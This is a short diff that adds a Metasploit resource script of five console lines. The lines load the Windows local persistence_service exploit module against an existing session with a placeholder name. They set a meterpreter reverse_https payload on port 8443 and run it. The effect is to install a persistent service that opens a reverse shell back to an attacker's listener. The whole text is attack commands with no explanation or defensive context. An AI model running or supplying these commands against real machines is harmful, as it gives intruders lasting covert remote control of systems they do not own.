@@ -1,0 +1,5 @@
+use exploit/windows/local/persistence_service
+set SESSION {system session}
+set payload windows/meterpreter/reverse_https
+set LPORT 8443
+run
